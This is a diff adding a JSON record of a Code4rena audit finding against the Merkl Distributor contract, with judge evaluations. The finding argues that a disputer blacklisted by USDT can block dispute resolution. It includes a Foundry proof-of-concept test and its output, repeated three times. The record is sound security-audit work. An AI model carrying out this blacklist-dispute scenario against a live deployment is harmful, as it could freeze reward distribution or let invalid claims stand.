@@ -1,0 +1,118 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "Merkl_T4ExvutBBXC",
+    "audit_uid": "T4ExvutBBXC",
+    "requested_submission_uid": "Yc4xRW9vCNx",
+    "requested_finding_uid": "xqZYwzeVXqw",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/Merkl_T4ExvutBBXC/20260618_144946/findings.json",
+    "source_submission_uid": "Yc4xRW9vCNx",
+    "source_finding_uid": "xqZYwzeVXqw",
+    "original_report_path": "Merkl_T4ExvutBBXC\\low_valid_Yc4xRW9vCNx.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "Yc4xRW9vCNx",
+  "finding_uid": "xqZYwzeVXqw",
+  "finding_number": "6",
+  "title": "Using USDT as dispute token can lead to some severe impacts",
+  "severity": "medium",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "0xDemon",
+  "body": "### Finding Description and Impact\n\nBased on [C4 docs](https://docs.code4rena.com/competitions/severity-categorization#unsupported-non-standard-tokens-and-fee-on-transfer-tokens) :\n\n> The only exceptions is USDT, which should be considered in-scope despite non-standard behavior.\n> \n\nSince there are no statement on the `README` about token in-scope, i believe this statement on C4 docs hold.\n\nJump into the issue, using `USDT` as dispute token will cause an issue. Consider scenario below :\n\n1. The root was updated with the wrong value with `updateTree()` function, which caused the wrong user can claim the token in Distributor contract.\n2. Attacker knowing this, he made a dispute using `disputeTree()` function\n3. After that, attacker make his address blacklisted\n4. Merkl team has two severe impacts here, if it does resolve with `true` it can’t happen because disputer address in this case attacker, already blacklisted. This lead to distributor contract `DoS’ed` because `resolveDispute()` always revert and next tree can’t be update. If it does resolve with `false` , this lead to wrong user can claim the token in Distributor contract.\n\n### Recommended Mitigation Steps\n\nConsider create intermediary contract to be a bridge between the disputer and the distributor contract",
+  "proof_of_concept": "Copy into `C4PoC.t.sol` and run **`forge test --match-test submissionValidity`**\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\n\npragma solidity ^0.8.17;\n\nimport { Fixture } from \"../Fixture.t.sol\";\n\n// @audit add this\nimport { DistributionCreator, DistributionParameters, CampaignParameters, RewardTokenAmounts } from \"../../contracts/DistributionCreator.sol\";\nimport { console } from \"forge-std/console.sol\";\nimport \"../../contracts/Distributor.sol\";\nimport { IAccessControlManager } from \"../../contracts/interfaces/IAccessControlManager.sol\";\nimport { ERC20 } from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\ncontract BlockableToken is ERC20 {\n    // --- Access Control ---\n    address owner;\n    modifier auth() { require(msg.sender == owner, \"unauthorised\"); _; }\n\n    // --- BlockList ---\n    mapping(address => bool) blocked;\n    function block(address usr) auth public { blocked[usr] = true; }\n    function allow(address usr) auth public { blocked[usr] = false; }\n\n    // --- Init ---\n    constructor() ERC20(\"USDT\", \"USDT\") {\n        owner = msg.sender;\n        _mint(owner, 1_000_000e6);\n    }\n\n    // --- Token ---\n    function transfer(address dst, uint wad) override public returns (bool) {\n        require(!blocked[msg.sender], \"blocked\");\n        require(!blocked[dst], \"blocked\");\n        return super.transfer(dst, wad);\n    }\n}\n\ncontract C4PoC is Fixture {\n    uint256 internal constant maxDistribForOOG = 1e4;\n    uint256 internal constant nbrDistrib = 10;\n    uint32 internal initStartTime;\n    uint32 internal initEndTime;\n    uint32 internal startTime;\n    uint32 internal endTime;\n    uint32 internal numEpoch;\n\n    // @audit add this\n    Distributor public distributorImpl;\n    Distributor public distributor;\n    BlockableToken public USDT;\n\n    function setUp() public override {\n        super.setUp();\n\n        initStartTime = uint32(block.timestamp);\n        numEpoch = 25;\n        initEndTime = startTime + numEpoch * EPOCH_DURATION;\n\n        vm.prank(governor);\n        creator.setFeeRecipient(dylan);\n\n        vm.startPrank(guardian);\n        address[] memory tokens = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n        tokens[0] = address(angle);\n        amounts[0] = 1e8;\n        creator.setRewardTokenMinAmounts(tokens, amounts);\n        vm.stopPrank();\n\n        angle.mint(address(alice), 1e22);\n        vm.prank(alice);\n        angle.approve(address(creator), type(uint256).max);\n\n        vm.stopPrank();\n    }\n\n    function test_submissionValidity() external {\n\n        // deploy USDT\n        USDT = new BlockableToken();\n        USDT.transfer(address(bob), 1000e6);\n\n        // set distributor \n        distributorImpl = new Distributor();\n        distributor = Distributor(deployUUPS(address(distributorImpl), hex\"\"));\n        distributor.initialize(IAccessControlManager(address(accessControlManager)));\n\n        // set new distributor in creator \n        vm.prank(governor);\n        creator.setNewDistributor(address(distributor));\n\n        // set dispute token and amount\n        vm.startPrank(governor);\n        distributor.setDisputeToken(USDT);\n        distributor.setDisputeAmount(100e6);\n        vm.stopPrank();\n\n        // fund bob and approve \n        vm.prank(bob);\n        USDT.approve(address(distributor), type(uint256).max);\n\n        // updateTree with wrong root\n        vm.prank(governor);\n        distributor.updateTree(MerkleTree({ merkleRoot: keccak256(abi.encodePacked(\"WRONG-ROOT\")), ipfsHash: keccak256(\"IPFS_HASH\") }));\n\n        // bob dispute\n        vm.prank(bob);\n        distributor.disputeTree(\"wrong-root\");\n\n        // Even merkl now this root wrong but this dispute can't be resolved because transfer to Bob will fail (blacklist effect)\n        // If merkl resolve with `false`, then malicious actor can claim the rewards \n\n        // bob get blacklisted\n        USDT.block(address(bob));\n\n        // resolve with `true` will fail due to bob is blocked\n        vm.prank(governor);\n        vm.expectRevert(\"blocked\");\n        distributor.resolveDispute(true);\n        \n    }\n}\n```\n\nResult :\n\n```solidity\nRan 1 test for test/c4/C4PoC.t.sol:C4PoC\n[PASS] test_submissionValidity() (gas: 3537485)\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 13.27ms (1.90ms CPU time)\n\nRan 1 test suite in 100.93ms (13.27ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-11-merkl/blob/e8c1d6f5a91c1144571c3ed238358a2b032dd32e/contracts/Distributor.sol#L288-L294"
+  ],
+  "source_record": {
+    "project_id": "T4ExvutBBXC",
+    "submission_index": "244",
+    "api_submission_id": "",
+    "uid": "Yc4xRW9vCNx",
+    "number": "244",
+    "title": "Using USDT as dispute token can lead to some severe impacts",
+    "severity": "medium",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "0xDemon",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-11-merkl/blob/e8c1d6f5a91c1144571c3ed238358a2b032dd32e/contracts/Distributor.sol#L288-L294"
+    ],
+    "body": "### Finding Description and Impact\n\nBased on [C4 docs](https://docs.code4rena.com/competitions/severity-categorization#unsupported-non-standard-tokens-and-fee-on-transfer-tokens) :\n\n> The only exceptions is USDT, which should be considered in-scope despite non-standard behavior.\n> \n\nSince there are no statement on the `README` about token in-scope, i believe this statement on C4 docs hold.\n\nJump into the issue, using `USDT` as dispute token will cause an issue. Consider scenario below :\n\n1. The root was updated with the wrong value with `updateTree()` function, which caused the wrong user can claim the token in Distributor contract.\n2. Attacker knowing this, he made a dispute using `disputeTree()` function\n3. After that, attacker make his address blacklisted\n4. Merkl team has two severe impacts here, if it does resolve with `true` it can’t happen because disputer address in this case attacker, already blacklisted. This lead to distributor contract `DoS’ed` because `resolveDispute()` always revert and next tree can’t be update. If it does resolve with `false` , this lead to wrong user can claim the token in Distributor contract.\n\n### Recommended Mitigation Steps\n\nConsider create intermediary contract to be a bridge between the disputer and the distributor contract",
+    "proof_of_concept": "Copy into `C4PoC.t.sol` and run **`forge test --match-test submissionValidity`**\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\n\npragma solidity ^0.8.17;\n\nimport { Fixture } from \"../Fixture.t.sol\";\n\n// @audit add this\nimport { DistributionCreator, DistributionParameters, CampaignParameters, RewardTokenAmounts } from \"../../contracts/DistributionCreator.sol\";\nimport { console } from \"forge-std/console.sol\";\nimport \"../../contracts/Distributor.sol\";\nimport { IAccessControlManager } from \"../../contracts/interfaces/IAccessControlManager.sol\";\nimport { ERC20 } from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\ncontract BlockableToken is ERC20 {\n    // --- Access Control ---\n    address owner;\n    modifier auth() { require(msg.sender == owner, \"unauthorised\"); _; }\n\n    // --- BlockList ---\n    mapping(address => bool) blocked;\n    function block(address usr) auth public { blocked[usr] = true; }\n    function allow(address usr) auth public { blocked[usr] = false; }\n\n    // --- Init ---\n    constructor() ERC20(\"USDT\", \"USDT\") {\n        owner = msg.sender;\n        _mint(owner, 1_000_000e6);\n    }\n\n    // --- Token ---\n    function transfer(address dst, uint wad) override public returns (bool) {\n        require(!blocked[msg.sender], \"blocked\");\n        require(!blocked[dst], \"blocked\");\n        return super.transfer(dst, wad);\n    }\n}\n\ncontract C4PoC is Fixture {\n    uint256 internal constant maxDistribForOOG = 1e4;\n    uint256 internal constant nbrDistrib = 10;\n    uint32 internal initStartTime;\n    uint32 internal initEndTime;\n    uint32 internal startTime;\n    uint32 internal endTime;\n    uint32 internal numEpoch;\n\n    // @audit add this\n    Distributor public distributorImpl;\n    Distributor public distributor;\n    BlockableToken public USDT;\n\n    function setUp() public override {\n        super.setUp();\n\n        initStartTime = uint32(block.timestamp);\n        numEpoch = 25;\n        initEndTime = startTime + numEpoch * EPOCH_DURATION;\n\n        vm.prank(governor);\n        creator.setFeeRecipient(dylan);\n\n        vm.startPrank(guardian);\n        address[] memory tokens = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n        tokens[0] = address(angle);\n        amounts[0] = 1e8;\n        creator.setRewardTokenMinAmounts(tokens, amounts);\n        vm.stopPrank();\n\n        angle.mint(address(alice), 1e22);\n        vm.prank(alice);\n        angle.approve(address(creator), type(uint256).max);\n\n        vm.stopPrank();\n    }\n\n    function test_submissionValidity() external {\n\n        // deploy USDT\n        USDT = new BlockableToken();\n        USDT.transfer(address(bob), 1000e6);\n\n        // set distributor \n        distributorImpl = new Distributor();\n        distributor = Distributor(deployUUPS(address(distributorImpl), hex\"\"));\n        distributor.initialize(IAccessControlManager(address(accessControlManager)));\n\n        // set new distributor in creator \n        vm.prank(governor);\n        creator.setNewDistributor(address(distributor));\n\n        // set dispute token and amount\n        vm.startPrank(governor);\n        distributor.setDisputeToken(USDT);\n        distributor.setDisputeAmount(100e6);\n        vm.stopPrank();\n\n        // fund bob and approve \n        vm.prank(bob);\n        USDT.approve(address(distributor), type(uint256).max);\n\n        // updateTree with wrong root\n        vm.prank(governor);\n        distributor.updateTree(MerkleTree({ merkleRoot: keccak256(abi.encodePacked(\"WRONG-ROOT\")), ipfsHash: keccak256(\"IPFS_HASH\") }));\n\n        // bob dispute\n        vm.prank(bob);\n        distributor.disputeTree(\"wrong-root\");\n\n        // Even merkl now this root wrong but this dispute can't be resolved because transfer to Bob will fail (blacklist effect)\n        // If merkl resolve with `false`, then malicious actor can claim the rewards \n\n        // bob get blacklisted\n        USDT.block(address(bob));\n\n        // resolve with `true` will fail due to bob is blocked\n        vm.prank(governor);\n        vm.expectRevert(\"blocked\");\n        distributor.resolveDispute(true);\n        \n    }\n}\n```\n\nResult :\n\n```solidity\nRan 1 test for test/c4/C4PoC.t.sol:C4PoC\n[PASS] test_submissionValidity() (gas: 3537485)\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 13.27ms (1.90ms CPU time)\n\nRan 1 test suite in 100.93ms (13.27ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/T4ExvutBBXC/submissions/244",
+    "raw": {
+      "auditUid": "T4ExvutBBXC",
+      "createdAt": "2025-11-27T17:20:59.088Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "HtWUgLG4M76",
+          "userUid": "YP8WqAJEHSw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-21T21:41:42.495Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "xqZYwzeVXqw"
+        },
+        {
+          "uid": "P2dXLi6Rfs5",
+          "userUid": "YP8WqAJEHSw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-21T21:41:49.947Z",
+          "type": "severity",
+          "value": "low",
+          "submissionUid": null,
+          "findingUid": "xqZYwzeVXqw"
+        },
+        {
+          "uid": "CMdkfugKg8F",
+          "userUid": "YP8WqAJEHSw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-21T21:42:32.842Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "Yc4xRW9vCNx",
+          "findingUid": null
+        }
+      ],
+      "finding": {
+        "uid": "xqZYwzeVXqw",
+        "number": 6,
+        "duplicates": 6
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "low",
+        "validity": "valid",
+        "updatedAt": "2025-12-21T21:42:32.842Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "medium",
+      "team": null,
+      "title": "Using USDT as dispute token can lead to some severe impacts",
+      "uid": "Yc4xRW9vCNx",
+      "updatedAt": "2025-11-27T17:20:59.088Z",
+      "user": {
+        "uid": "UZsJrrefsPj",
+        "handle": "0xDemon"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "### Finding Description and Impact\n\nBased on [C4 docs](https://docs.code4rena.com/competitions/severity-categorization#unsupported-non-standard-tokens-and-fee-on-transfer-tokens) :\n\n> The only exceptions is USDT, which should be considered in-scope despite non-standard behavior.\n> \n\nSince there are no statement on the `README` about token in-scope, i believe this statement on C4 docs hold.\n\nJump into the issue, using `USDT` as dispute token will cause an issue. Consider scenario below :\n\n1. The root was updated with the wrong value with `updateTree()` function, which caused the wrong user can claim the token in Distributor contract.\n2. Attacker knowing this, he made a dispute using `disputeTree()` function\n3. After that, attacker make his address blacklisted\n4. Merkl team has two severe impacts here, if it does resolve with `true` it can’t happen because disputer address in this case attacker, already blacklisted. This lead to distributor contract `DoS’ed` because `resolveDispute()` always revert and next tree can’t be update. If it does resolve with `false` , this lead to wrong user can claim the token in Distributor contract.\n\n### Recommended Mitigation Steps\n\nConsider create intermediary contract to be a bridge between the disputer and the distributor contract",
+      "proofOfConcept": "Copy into `C4PoC.t.sol` and run **`forge test --match-test submissionValidity`**\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\n\npragma solidity ^0.8.17;\n\nimport { Fixture } from \"../Fixture.t.sol\";\n\n// @audit add this\nimport { DistributionCreator, DistributionParameters, CampaignParameters, RewardTokenAmounts } from \"../../contracts/DistributionCreator.sol\";\nimport { console } from \"forge-std/console.sol\";\nimport \"../../contracts/Distributor.sol\";\nimport { IAccessControlManager } from \"../../contracts/interfaces/IAccessControlManager.sol\";\nimport { ERC20 } from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\ncontract BlockableToken is ERC20 {\n    // --- Access Control ---\n    address owner;\n    modifier auth() { require(msg.sender == owner, \"unauthorised\"); _; }\n\n    // --- BlockList ---\n    mapping(address => bool) blocked;\n    function block(address usr) auth public { blocked[usr] = true; }\n    function allow(address usr) auth public { blocked[usr] = false; }\n\n    // --- Init ---\n    constructor() ERC20(\"USDT\", \"USDT\") {\n        owner = msg.sender;\n        _mint(owner, 1_000_000e6);\n    }\n\n    // --- Token ---\n    function transfer(address dst, uint wad) override public returns (bool) {\n        require(!blocked[msg.sender], \"blocked\");\n        require(!blocked[dst], \"blocked\");\n        return super.transfer(dst, wad);\n    }\n}\n\ncontract C4PoC is Fixture {\n    uint256 internal constant maxDistribForOOG = 1e4;\n    uint256 internal constant nbrDistrib = 10;\n    uint32 internal initStartTime;\n    uint32 internal initEndTime;\n    uint32 internal startTime;\n    uint32 internal endTime;\n    uint32 internal numEpoch;\n\n    // @audit add this\n    Distributor public distributorImpl;\n    Distributor public distributor;\n    BlockableToken public USDT;\n\n    function setUp() public override {\n        super.setUp();\n\n        initStartTime = uint32(block.timestamp);\n        numEpoch = 25;\n        initEndTime = startTime + numEpoch * EPOCH_DURATION;\n\n        vm.prank(governor);\n        creator.setFeeRecipient(dylan);\n\n        vm.startPrank(guardian);\n        address[] memory tokens = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n        tokens[0] = address(angle);\n        amounts[0] = 1e8;\n        creator.setRewardTokenMinAmounts(tokens, amounts);\n        vm.stopPrank();\n\n        angle.mint(address(alice), 1e22);\n        vm.prank(alice);\n        angle.approve(address(creator), type(uint256).max);\n\n        vm.stopPrank();\n    }\n\n    function test_submissionValidity() external {\n\n        // deploy USDT\n        USDT = new BlockableToken();\n        USDT.transfer(address(bob), 1000e6);\n\n        // set distributor \n        distributorImpl = new Distributor();\n        distributor = Distributor(deployUUPS(address(distributorImpl), hex\"\"));\n        distributor.initialize(IAccessControlManager(address(accessControlManager)));\n\n        // set new distributor in creator \n        vm.prank(governor);\n        creator.setNewDistributor(address(distributor));\n\n        // set dispute token and amount\n        vm.startPrank(governor);\n        distributor.setDisputeToken(USDT);\n        distributor.setDisputeAmount(100e6);\n        vm.stopPrank();\n\n        // fund bob and approve \n        vm.prank(bob);\n        USDT.approve(address(distributor), type(uint256).max);\n\n        // updateTree with wrong root\n        vm.prank(governor);\n        distributor.updateTree(MerkleTree({ merkleRoot: keccak256(abi.encodePacked(\"WRONG-ROOT\")), ipfsHash: keccak256(\"IPFS_HASH\") }));\n\n        // bob dispute\n        vm.prank(bob);\n        distributor.disputeTree(\"wrong-root\");\n\n        // Even merkl now this root wrong but this dispute can't be resolved because transfer to Bob will fail (blacklist effect)\n        // If merkl resolve with `false`, then malicious actor can claim the rewards \n\n        // bob get blacklisted\n        USDT.block(address(bob));\n\n        // resolve with `true` will fail due to bob is blocked\n        vm.prank(governor);\n        vm.expectRevert(\"blocked\");\n        distributor.resolveDispute(true);\n        \n    }\n}\n```\n\nResult :\n\n```solidity\nRan 1 test for test/c4/C4PoC.t.sol:C4PoC\n[PASS] test_submissionValidity() (gas: 3537485)\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 13.27ms (1.90ms CPU time)\n\nRan 1 test suite in 100.93ms (13.27ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```",
+      "linesOfCode": "https://github.com/code-423n4/2025-11-merkl/blob/e8c1d6f5a91c1144571c3ed238358a2b032dd32e/contracts/Distributor.sol#L288-L294",
+      "number": 244,
+      "aiExplanation": null,
+      "_index": 244
+    }
+  }
+}
